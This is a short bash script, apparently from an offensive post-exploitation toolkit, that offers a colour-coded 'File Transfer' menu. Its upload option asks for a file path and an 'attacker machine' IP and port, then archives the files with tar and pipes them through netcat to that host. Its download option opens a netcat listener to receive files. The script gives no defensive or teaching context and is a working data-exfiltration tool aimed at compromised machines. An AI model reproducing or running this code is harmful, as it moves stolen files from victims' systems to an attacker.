#!/bin/bash

RED='\033[31;1m'
GREEN='\033[32;1m'
BLUE='\033[34;1m'
YELLOW='\033[33;1m'
RED_BLINK='\033[31;5;1m'
END='\033[m'

function file_transfer() {
	while :
	do
	echo -e $YELLOW
	echo "    File Transfer"
	echo -e $END
	echo "    [1] Upload/send"
	echo "    [2] Download/get"
	echo "    [3] Return"
	read -p "    [?] Option: " method


	# Download pastes
	if [ "$method" == 1 ]
	then
		echo
		echo "    == Guide =="
		echo "    Attacker kernel: nc -lvp [PORT] | tar zxv"
		echo
		read -p "    [?] Paste route           : " paste
		read -p "    [?] Attacker machine ip   : " ip
		read -p "    [?] Attacker machine port : " port
		echo
		tar czp $paste | nc $ip $port


	# Send pastes
	elif [[ "$method" == 2 ]]; then
		echo
		read -p "    [?] Select a port to listen : " port
		echo
		echo "    Listening port: ${port}"
		echo "    Use: tar czp route_paste | nc $(ip route get 8.8.8.8 | cut -d " " -f 7) ${port}"
		echo
		nc -lvp $port | tar zxv
		echo


	# Return condition
	elif [[ "$method" == 3 ]]; then
		 break
	else
		echo "    [!] Unknow command"
	fi
	done
}
